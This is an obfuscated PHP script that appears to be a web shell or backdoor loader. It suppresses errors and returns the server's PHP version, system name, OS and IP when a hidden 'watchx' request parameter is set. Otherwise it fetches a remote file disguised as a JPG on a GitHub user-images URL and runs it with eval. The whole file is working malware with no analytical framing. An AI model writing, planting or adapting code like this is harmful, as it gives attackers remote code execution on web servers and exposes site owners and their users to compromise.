
<?php

$GLOBALS["lnrkdexmo"] = "result";
$GLOBALS["fcgthfemb"] = "a";
$GLOBALS["kmnpcocuqa"] = "ch";
$GLOBALS["nqusfcueqf"] = "version";
$GLOBALS["mluhaqb"] = "ip";
$GLOBALS["ltnbuthggrc"] = "a";
error_reporting(0);
ini_set("display_errors", 0);
if ($_REQUEST["watchx"]) {
    $wfmjlpuc = "ip";
    $GLOBALS["kumviinoca"] = "version";
    $twcfypprtyn = "uname";
    $version = phpversion();
    $GLOBALS["tvefrhpr"] = "uname";
    $uname = php_uname();
    $ip = gethostbyname($_SERVER["HTTP_HOST"]);
    echo json_encode(array("version" => $version, "uname" => $uname, "platform" => PHP_OS, "ip" => $ip, "workingx" => true));
    die;
}
function get_contents($url)
{
    $wyeeuqehxtz = "ch";
    ${$GLOBALS["kmnpcocuqa"]} = curl_init("{$url}");
    curl_setopt(${$GLOBALS["kmnpcocuqa"]}, CURLOPT_RETURNTRANSFER, 1);
    $GLOBALS["oxuwprq"] = "ch";
    curl_setopt(${$GLOBALS["kmnpcocuqa"]}, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt(${$wyeeuqehxtz}, CURLOPT_USERAGENT, "Mozilla/5.0(Windows NT 6.1; 32.0) Gecko/20100101 Firefox/32.0");
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt(${$GLOBALS["kmnpcocuqa"]}, CURLOPT_SSL_VERIFYHOST, 0);
    $GLOBALS["cbtslil"] = "ch";
    curl_setopt(${$GLOBALS["kmnpcocuqa"]}, CURLOPT_COOKIEJAR, $GLOBALS["coki"]);
    curl_setopt(${$GLOBALS["kmnpcocuqa"]}, CURLOPT_COOKIEFILE, $GLOBALS["coki"]);
    ${$GLOBALS["lnrkdexmo"]} = curl_exec($ch);
    return ${$GLOBALS["lnrkdexmo"]};
}
${$GLOBALS["ltnbuthggrc"]} = get_contents("https://user-images.githubusercontent.com/117648087/203039071-b13e52a6-9595-4681-877e-596da9d2a6fb.jpg");
eval("?>" . ${$GLOBALS["fcgthfemb"]});
